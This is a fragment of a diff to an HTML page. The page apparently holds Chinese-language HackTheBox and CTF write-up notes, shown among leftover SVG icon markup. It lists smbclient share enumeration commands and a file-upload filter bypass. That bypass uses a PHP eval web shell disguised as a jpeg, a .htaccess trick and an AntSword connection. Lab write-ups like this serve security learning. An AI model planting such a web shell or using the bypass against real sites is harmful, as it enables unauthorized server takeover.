+<path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path>
+<path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path>
+</svg>
+</span><pre><code> smbclient -L [target_ip]
 #列出所有可用共享
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+</code></pre></blockquote>
 <p><img src="/post/htb(STARTING-POINT)/image-20230127010237573.png" alt="image-20230127010237573"></p>
 <pre><code>smbclient \\\\[target_ip]\\WorkShares
 #连接到 WorkShares
@@ -21514,7 +21642,7 @@ auto_prepend_file=haha.gif
 <p>第二也是关键的，它只允许上传<code>content-type: image/jpeg</code>，png和gif都不可以</p>
 <p>第三点就是它过滤了文件内容里含<code>&lt;?</code></p>
 <p>所以上传一个jpeg文件，抓包修改内容为非php但包含php的一个脚本，</p>
-<pre class="line-numbers language-jsp"><code class="language-jsp"><script language="php">@eval($_POST["cmd"]);</script>
+<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"php"</span><span class="token operator">></span>@<span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>再上传.htaccess文件，解析所有文件为php</p>
 <p>用蚁剑连接jpeg文件，即可</p>
